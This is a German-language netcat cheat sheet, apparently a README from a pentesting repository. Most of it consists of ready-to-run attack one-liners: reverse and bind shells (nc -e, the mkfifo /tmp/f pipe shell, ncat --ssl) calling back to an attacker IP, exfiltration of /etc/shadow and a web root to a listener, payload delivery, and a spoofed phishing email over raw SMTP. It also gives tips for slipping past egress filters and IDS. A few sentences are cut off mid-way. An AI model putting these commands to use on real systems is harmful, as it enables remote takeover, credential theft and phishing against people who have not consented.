<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🔌 Netcat (nc) – Vollständiger Cheatsheet

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       The TCP/IP Swiss Army Knife for Pentesters & Sysadmins
```
<p align="center">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Category-Exploitation_&_Shells-orange?style=for-the-badge" alt="Exploitation & Shells">
  <img src="https://img.shields.io/badge/Protocols-TCP_UDP-green?style=for-the-badge" alt="Protokolle TCP/UDP">
  <img src="https://img.shields.io/badge/License-BSD_/_GPL-red?style=for-the-badge" alt="License">
</p>

<p align="center">
  <b>🌐 Lesen und schreiben Sie Rohdaten über Netzwerkverbindungen mithilfe der Protokolle TCP und UDP</b>
</p>

---

## 📋 Inhaltsverzeichnis

- [Überblick und die Netcat-Philosophie](#-overview--the-netcat-philosophy)
- [Netcat-Varianten und das Geschmacksdilemma](#-netcat-variants--the-flavor-dilemma)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Traditionelles Netcat (`nc.traditional`)](#traditional-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Tool-Vergleich: Netcat-Varianten vs. Socat](#-tool-comparison-netcat-variants-vs-socat)
- [Installations- und Schaltvarianten](#-installation--switching-variants)
- [Kernbefehlszeilenflags](#-core-command-line-flags)
- [Port-Scanning und Banner-Grabbing](#-port-scanning--banner-grabbing)
- [Shells umkehren und binden](#-reverse--bind-shells)
  - [Traditionelle Shell-Ausführung (`-e`)](#traditional-shell-execution--e)
  - [OpenBSD FIFO Named Pipe Reverse Shell](#openbsd-fifo-named-pipe-reverse-shell)
  - [OpenBSD FIFO Bind Shell](#openbsd-fifo-bind-shell)
  - [Verschlüsselte TLS-Shell mit Ncat (`--ssl`)](#encrypted-tls-shell-with-ncat---ssl)
- [Dateiübertragungstechniken](#-file-transfer-techniques)
  - [Ziel an Angreifer (Exfiltration)](#target-to-attacker-exfiltration)
  - [Angreifer zum Ziel (Payload Delivery)](#attacker-to-target-payload-delivery)
  - [On-the-Fly-Verzeichnisarchivierung (`tar + nc`)](#on-the-fly-directory-archiving-tar--nc)
- [Portweiterleitung und Netzwerk-Relays](#-port-forwarding--network-relays)
- [Webserver- und Honeypot-Emulation](#-web-server--honeypot-emulation)
- [Netzwerk-Debugging und manuelle Protokollinteraktion](#-network-debugging--manual-protocol-interaction)
- [Kurzreferenztabelle](#-quick-reference-table)
- [Verteidigungsüberlegungen und OPSEC](#-defensive-considerations--opsec)
- [Rechtlicher Haftungsausschluss](#-legal-disclaimer)

---

## 🎯 Überblick und die Netcat-Philosophie

Ursprünglich 1995 von **Hobbit** verfasst, wird **Netcat** (oft einfach als 

Im Gegensatz zu High-Level-Anwendungsprotokollen oder aufgeblähten Verwaltungstools leistet Netcat eine Sache außergewöhnlich gut: **Es öffnet rohe Netzwerk-Pipes auf Byte-Ebene über TCP- oder UDP-Sockets und verbindet sie direkt mit der Standardeingabe (`stdin`) und der Standardausgabe (`stdout`)**.

Ganz gleich, ob Sie auf Reverse-Shells warten, verdeckte Exfiltrationskanäle einrichten, Banner-Grabbing-Dienste nutzen, Dateien ohne SMB/FTP übertragen oder Firewall-Paketfilterung diagnostizieren, Netcat bleibt ein unverzichtbares Dienstprogramm im Arsenal jedes Sicherheitsexperten.

---

## ⚖️ Netcat-Varianten und das Geschmacksdilemma

Eine der häufigsten Ursachen für Verwirrung bei Penetrationstests und CTF-Herausforderungen ist, dass **mehrere unterschiedliche Implementierungen den `nc`-Befehl gemeinsam nutzen**. Das Verständnis, mit welcher Variante Sie interagieren, bestimmt die Syntax und die Nutzlastmöglichkeiten.
```
+-------------------------------------------------------------------------+
|                              The nc Command                             |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|             (Default: OpenBSD)     |               (Default: Ncat)      |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(No -e compile flag)   (GAPING_SECURITY_HOLE)   (Nmap Project / SSL)
```
### OpenBSD Netcat (`nc.openbsd`)
- **Standard:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **Hauptmerkmal:** Standardmäßig ohne das `-e`-Flag (Programm ausführen) kompiliert, um triviale Schwachstellen bei der Ausführung willkürlichen Codes zu verhindern.
- **Syntax identifizieren:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Output: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Problemumgehung bei der Shell-Ausführung:** Verwendet Linux-Named Pipes (`mkfifo`), um `stdin` und `stdout` zurück in `/bin/sh` zu überbrücken.

### Traditioneller Netcat (`nc.traditional`)
- **Originalautor:** Hobbit (v1.10).
- **Hauptmerkmal:** Kompiliert mit der `-DGAPING_SECURITY_HOLE`-Direktive, die das native `-e`/`-c`-Flag (`nc -e /bin/bash`) ermöglicht.
- **Syntax identifizieren:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```
### Nmap Ncat (`ncat`)
- **Verwaltet von:** Gordon Lyon (Fyodor) / The Nmap Project.
- **Hauptmerkmal:** Eine moderne Neufassung, die **TLS/SSL-Verschlüsselung**, IP-Zugriffskontrolllisten (`--allow`, `--deny`), Verbindungsvermittlung (`--broker`), SOCKS4/5-Proxying und plattformübergreifende native Ausführung unterstützt.

---

## ⚖️ Tool-Vergleich: Netcat-Varianten vs. Socat

| Funktion | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|----|--------|---------------|---------|
| **Ausführbares Flag (`-e`)** | ❌ Ausgezogen | ✅ Native (`-e`) | ✅ Nativ (`-e`, `--exec`) | ✅ Native (`EXEC:`) |
| **SSL-/TLS-Verschlüsselung** | ❌ Nein | ❌ Nein | ✅ Native (`--ssl`) | ✅ Native (`OPENSSL:`) |
| **FIFO-Rohrschalen** | ✅ Ja (`mkfifo`) | ✅ Ja | ✅ Ja | ✅ Ja |
| **Port-Scanmodus** | ✅ Ja (`-z`) | ✅ Ja (`-z`) | ❌ Nein | ❌ Nein |
| **Persistenter Listener** | ✅ Ja (`-k`) | ❌ Nein (wird beim Trennen beendet) | ✅ Ja (`-k`, `--keep-open`) | ✅ Ja (`fork`) |
| **IPv6-Unterstützung** | ✅ Native (`-6`) | ❌ Begrenzt | ✅ Native (`-6`) | ✅ Einheimisch |
| **Proxy / SOCKS-Client** | ✅ Ja (`-X`, `-x`) | ❌ Nein | ✅ Ja (`--proxy`) | ✅ Vollständige Proxy-Unterstützung |
| **Multi-Client-Chat / Broker**| ❌ Nein | ❌ Nein | ✅ Native (`--broker`) | ❌ Manuelle Einrichtung |
| **Standard bei Kali / Debian** | ✅ Ja (`/bin/nc`) | 🔄 Verfügbar (`apt`) | 🔄 Verfügbar (`ncat`) | 🔄 Verfügbar (`socat`) |

---

## 📥 Installations- & Schaltvarianten

Auf Debian-basierten Distributionen (einschließlich Kali Linux) können Sie alle Varianten installieren und über `update-alternatives` zwischen ihnen wechseln:
```bash
# Install all Netcat implementations
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Check current default alternative
readlink -f /bin/nc

# Switch default nc binary interactively
sudo update-alternatives --config nc
```
Um eine bestimmte Variante explizit auszuführen, ohne systemweite Standardeinstellungen zu ändern:
```bash
# Invoke OpenBSD variant directly
nc.openbsd -lvnp 4444

# Invoke Traditional variant directly
nc.traditional -lvnp 4444 -e /bin/bash

# Invoke Nmap Ncat
ncat -lvnp 4444 --ssl
```
---

## ⚙️ Kernbefehlszeilenflags

| Flagge | Bedeutung & Beschreibung |
|------|--------|
| `-l` | **Abhörmodus**: Warten Sie auf eingehende Verbindungen, anstatt ausgehende Verbindungen zu initiieren. |
| `-v` | **Ausführlicher Modus**: Detaillierte Verbindungs- und Diagnoseinformationen drucken (`-vv` für höhere Ausführlichkeit). |
| `-n` | **Nur numerische IP**: Deaktivieren Sie die umgekehrte DNS-Auflösung für Geschwindigkeit und Tarnung. |
| `-p <port>` | **Lokaler Port**: Geben Sie den lokalen Port zum Binden oder Abhören an. |
| `-u` | **UDP-Modus**: Verwenden Sie das UDP-Protokoll anstelle des Standard-TCP-Streams. |
| `-k` | **Weiterhören**: Hören Sie weiterhin zu und akzeptieren Sie neue Verbindungen, nachdem ein Client die Verbindung getrennt hat. |
| `-w <sec>` | **Timeout**: Timeout in Sekunden für den Verbindungsaufbau und Leerlauf-Socket-Lesevorgänge. |
| `-z` | **Zero-I/O-Modus**: Scanmodus; Keine Nutzdaten senden und Socket sofort nach dem Handshaking schließen. |
| `-q <sec>` | **Beenden nach EOF**: Warten Sie die angegebenen Sekunden nach dem Empfang von EOF auf `stdin`, bevor Sie den Vorgang beenden. |
| `-s <ip>` | **Quell-IP**: An eine bestimmte lokale Schnittstelle/Quell-IP-Adresse binden. |
| `-4` / `-6` | Erzwingen Sie ausschließlich die IPv4- oder IPv6-Adressierung. |

---

## 🔍 Port-Scanning und Banner-Grabbing

Während dedizierte Tools wie `nmap` oder

### Schnelles Port-Scannen
```bash
# TCP Port Scan on a specific port range (Zero-I/O, numeric, 1s timeout)
nc -zvn -w 1 192.168.1.100 20-100

# Scan specific common service ports
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# Scan UDP Ports (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```
### Service-Banner-Grabbing

Bannergrabbing extrahiert Rohversionszeichenfolgen von Remote-Daemons zur Identifizierung von Schwachstellen:
```bash
# Banner grab an SSH daemon
nc -vn 10.10.10.10 22

# Banner grab an FTP server
nc -vn 10.10.10.10 21

# Banner grab an SMTP mail server
nc -vn 10.10.10.10 25

# Manual HTTP HEAD / GET request
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```
---

## 💀 Muscheln umkehren und binden

Das Anschließen eines Remote-Befehlsinterpreters (`/bin/sh`, `/bin/bash`, `cmd.exe`) über einen Netcat-Socket ist eine der grundlegendsten Penetrationstesttechniken.

### Traditionelle Shell-Ausführung (`-e`)

Wenn auf dem Zielsystem `netcat-traditional` oder `ncat` mit Ausführungsunterstützung installiert ist:
```bash
# 1. Attacker sets up a listener
nc -lvnp 4444

# 2. Target sends a reverse shell (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Target sends a reverse shell (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Bind Shell (Target listens, attacker connects)
# On Target:
nc.traditional -lvnp 8888 -e /bin/bash
# On Attacker:
nc -vn 10.10.10.50 8888
```
### OpenBSD FIFO Named Pipe Reverse Shell

Auf modernen Debian-, Ubuntu-, Kali- und Fedora-Distributionen fehlt `nc` das `-e`-Flag. Verwenden Sie eine **FIFO (First-In-First-Out) Named Pipe**, um Standardeingabe und Standardausgabe umzuleiten:
```bash
# 1. Attacker sets up listener
nc -lvnp 4444

# 2. Target executes named pipe reverse shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```
#### So funktioniert die FIFO-Pipeline:
1. `rm -f /tmp/f`: Entfernt alle veralteten Pipe-Dateien.
2. `mkfifo /tmp/f`: Erstellt eine spezielle benannte FIFO-Pipe in `/tmp`.
3. `cat /tmp/f`: Liest die in die Pipe übermittelte Eingabe und leitet sie an `/bin/sh -i` weiter.
4. `| /bin/sh -i 2>&1`: Erzeugt eine interaktive Shell, die den Standardfehler (`stderr`) zur Standardausgabe (`stdout`) umleitet.
5. `| nc 10.10.14.5 4444 >/tmp/f`: Leitet die Shell-Ausgabe über das Netzwerk an den Angreifer weiter, während empfangene Netzwerk-Tastenanschläge zurück in `/tmp/f` geschrieben werden.

### OpenBSD FIFO Bind Shell

Wenn das Ziel über eine routbare öffentliche oder lokale IP verfügt und eingehende Firewallregeln Datenverkehr zulassen:
```bash
# On Victim / Target machine:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# On Attacker machine:
nc -vn 10.10.10.50 8888
```
### Verschlüsselte TLS-Shell mit Ncat (`--ssl`)

Unverschlüsselter Netcat-Verkehr kann von IDS/IPS und Netzwerkabgriffen überprüft werden. `ncat` unterstützt nativ die TLS/SSL-Verschlüsselung:
```bash
# 1. Attacker sets up an SSL encrypted listener
ncat --ssl -lvnp 4444

# 2. Victim connects with an encrypted reverse shell
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# SSL listener with IP Access Control (Whitelisting attacker IP only)
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```
---

## 📁 Dateiübertragungstechniken

Wenn SSH, SCP, FTP und SMB blockiert oder deinstalliert sind, stellt Netcat eine sofortige, bidirektionale Dateiübertragungspipeline über jeden offenen TCP-Port bereit.

### Ziel zum Angreifer (Exfiltration)
```bash
# 1. Attacker opens a listener and redirects incoming stream to a local file
nc -lvnp 9001 > loot_passwords.txt

# 2. Target reads sensitive file and sends it to attacker's listener
nc -vn 10.10.14.5 9001 < /etc/shadow
```
### Angreifer zum Ziel (Payload Delivery)
```bash
# 1. Attacker hosts the payload file on a listener
nc -lvnp 9001 < linpeas.sh

# 2. Target connects and saves the stream to disk
nc -vn 10.10.14.5 9001 > linpeas.sh
```
### Integritätsüberprüfung (Prüfsummen)

Überprüfen Sie immer die Byte-Integrität nach unformatierten Netcat-Übertragungen:
```bash
# Calculate MD5 on both source and destination machines
md5sum transferred_file.tar.gz
```
### On-the-Fly-Verzeichnisarchivierung (`tar + nc`)

Übertragen Sie ganze Verzeichnisstrukturen, ohne zwischenzeitliche temporäre Archivdateien auf der Festplatte des Opfers zu erstellen:
```bash
# 1. Attacker listens and extracts incoming tar stream directly
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Target compresses and streams directory across the wire
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```
---

## 🔀 Portweiterleitung und Netzwerk-Relays

Netcat kann als leichtgewichtiges Netzwerk-Relay fungieren, ohne dass eine SSH-Portweiterleitung erforderlich ist:
```bash
# Relay traffic arriving on Port 8080 to an internal database on 192.168.20.10:3306
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```
---

## 🌐 Webserver- und Honeypot-Emulation

### Minimalistischer Single-File-HTTP-Server

Stellen Sie eine statische HTTP-Nutzlast bereit oder erfassen Sie von Browsern übermittelte Anmeldeinformationen:
```bash
# One-shot HTTP response
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Continuous loop HTTP server (captures POST credentials and browser headers)
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nCaptured Request!" | \
  nc -lvnp 8080
done
```
### Multi-Client-Chat/Message-Broker (`ncat`)

Ncat verfügt über einen integrierten Broker-Modus, der einen IRC-ähnlichen Ad-hoc-Relaisraum für Red-Team-Betreiber erstellt:
```bash
# Attacker runs broker on port 5555
ncat -lvnp 5555 --broker

# Multiple operators connect and broadcast messages to each other
ncat 10.10.14.5 5555
```
---

## 🛠️ Netzwerk-Debugging und manuelle Protokollinteraktion

### Rohe SMTP-Mail-Injection
```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<victim@target.local>
DATA
Subject: Critical Security Patch

Please follow the attachment instructions.
.
QUIT
EOF
```
### Roher POP3-Mail-Abruf
```bash
nc -vn mail.target.local 110
# Server replies: +OK POP3 server ready
USER testuser
# Server replies: +OK
PASS SecretPassword123
# Server replies: +OK User logged in
STAT
RETR 1
QUIT
```
---

## ⚡ Kurzreferenztabelle

| Ziel | Befehl |
|-----------|---------|
| **Standard-Listener** | `nc -lvnp <PORT>` |
| **Persistenter Listener** | `nc -lvnp <PORT> -k` |
| **Mit Remote-Host verbinden** | `nc -vn <HOST> <PORT>` |
| **Verbindung über UDP herstellen** | `nc -u -vn <HOST> <PORT>` |
| **Port-Scan TCP (Schnell)** | `nc -zvn -w 1 <HOST> <START>-<END>` |
| **Port-Scan UDP** | `nc -zvun -w 2 <HOST> <PORT>` |
| **OpenBSD Named Pipe Shell** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Traditionelle Shell (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Verschlüsselte SSL-Shell (`ncat`)**| `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Datei empfangen (Exfil-Listener)**| `nc -lvnp <PORT> > output_file` |
| **Datei senden (Exfil-Absender)** | `nc -vn <IP> <PORT> < input_file` |
| **Ordner über Tar streamen** | `tar -czvf - /path \| nc -vn <IP> <PORT>` |
| **Gestreamten Ordner extrahieren** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Banner-Grabbing** | `nc -vn -w 2 <HOST> <PORT>` |

---

## 🛡️ Defensive Überlegungen und OPSEC

1. **Unverschlüsselte Klartextwarnung:**
   - Standard-Netcat verwendet **keine** kryptografische Kapselung. Alle über den Klartext `nc` gesendeten Passwörter, Sitzungstokens oder Shell-Befehle können von NSM-Sensoren (Network Security Monitoring) (Zeek, Suricata, Wireshark) extrahiert werden.
   - Verwenden Sie `ncat --ssl` oder wickeln Sie den Datenverkehr nach Möglichkeit in einen SSH/TLS-Tunnel ein.
2. **Prozessprüfung und Sysmon:**
   – Auf Linux-Systemen kennzeichnet die Prozessausführungsprotokollierung (`auditd`, eBPF, Falco) Aufrufe von `nc`, die Flags wie `-e` oder Befehle enthalten, die `/tmp/f` und `mkfifo` erstellen.
   – Unter Windows markieren oder isolieren EDR-Agenten `nc.exe`-Binärdateien aufgrund bekannter statischer Signaturen routinemäßig.
3. **Eingehende Firewall-Einschränkungen:**
   – Wählen Sie immer gemeinsame ausgehende Ports (`80`, `443`, `53`), wenn Sie Reverse-Shell-Listener konfigurieren, um strenge Ausgangsfilterrichtlinien zu umgehen.

---

## ⚠️ Rechtlicher Haftungsausschluss

> [!ACHTUNG]
> Dieses Cheatsheet ist nur für autorisierte Penetrationstests, Schwachstellenbewertungen, CTF-Wettbewerbe und Systemadministrationszwecke bestimmt. Das Abfangen des Netzwerkverkehrs, das Herausfiltern von Daten oder das Ausführen von Reverse-Shells gegen Systeme ohne ausdrückliche schriftliche Zustimmung ist illegal und nach den Cybersicherheitsgesetzen weltweit strafbar. Verantwortungsvoller und ethischer Umgang.